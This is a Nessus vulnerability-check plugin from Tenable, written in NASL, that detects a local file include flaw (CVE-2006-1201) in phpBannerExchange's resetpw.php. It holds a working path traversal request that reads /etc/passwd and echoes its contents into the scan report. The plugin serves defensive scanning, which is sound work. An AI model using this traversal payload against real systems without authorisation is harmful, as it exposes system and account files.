#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is prone to a local
file include flaw. 

Description :

The remote host is running phpBannerExchange, a banner exchange script
written in PHP. 

The version of phpBannerExchange installed on the remote host uses a
template class that fails to sanitize user-supplied input before using
it in a PHP 'include()' function.  An unauthenticated attacker can
exploit this issue to view arbitrary files and possibly to execute
arbitrary PHP code on the affected system subject to the privileges of
the web server user id. 

See also :

http://lists.grok.org.uk/pipermail/full-disclosure/2006-March/042769.html

Solution :

Unknown at this time. 

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:P/I:N/A:N/B:N)";


if (description) {
  script_id(21153);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-1201");
  script_bugtraq_id(16996);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"23720");

  script_name(english:"phpBannerExchange Template Class Local File Include Vulnerability");
  script_summary(english:"Tries to read a file using phpBannerExchange's template class");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/bannerexchange", "/exchange", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  file = "../../../../../../../../../../../../etc/passwd";
  req = http_get(
    item:string(
      dir, "/resetpw.php?",
      "email=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # it looks like phpBannerExchange and...
    'form method="POST" action="addacctconfirm.php' >< res &&
    # there's an entry for root.
    egrep(pattern:"root:.*:0:[01]:", string:res)
  ) {
    content = strstr(res, "<b>");
    if (content) content = content - "<b>";
    if (content) content = content - strstr(content, "</b>");
    if (isnull(content)) content = res;

    report = string(
      desc,
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Here are the contents of the file '/etc/passwd' that\n",
      "Nessus was able to read from the remote host :\n",
      "\n",
      content
    );

    security_note(port:port, data:report);
    exit(0);
  }
}
